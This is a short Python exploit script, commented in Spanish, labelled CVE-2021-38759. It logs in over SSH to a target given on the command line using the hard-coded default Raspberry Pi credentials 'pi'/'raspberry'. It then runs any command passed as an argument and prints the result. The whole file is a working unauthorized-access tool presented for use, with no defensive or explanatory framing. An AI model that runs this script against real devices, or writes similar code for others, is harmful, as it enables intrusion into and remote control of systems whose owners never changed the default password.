#!/usr/bin/python3

# CVE-2021-38759

import paramiko
import sys

host = sys.argv[1] # El host como primer argumento al ejiecutar el exploit

# Credenciales por Default de un Raspberry Pi 3
user = "pi"
password = "raspberry"

conection = paramiko.client.SSHClient() # Instanciacion de clase SSHClient()

conection.set_missing_host_key_policy(paramiko.AutoAddPolicy()) # Agrega claves a este conjunto de pplitivas y las guarda 
                                                        # cuando se conecta a un servidor previamente desconocido
conection.connect(host, username = user, password = password)

comando = sys.argv[2] # comando a enviar por consola

i,o,e = conection.exec_command(comando) # enviamos el comando que deseemos

print(o.read())

conection.close()
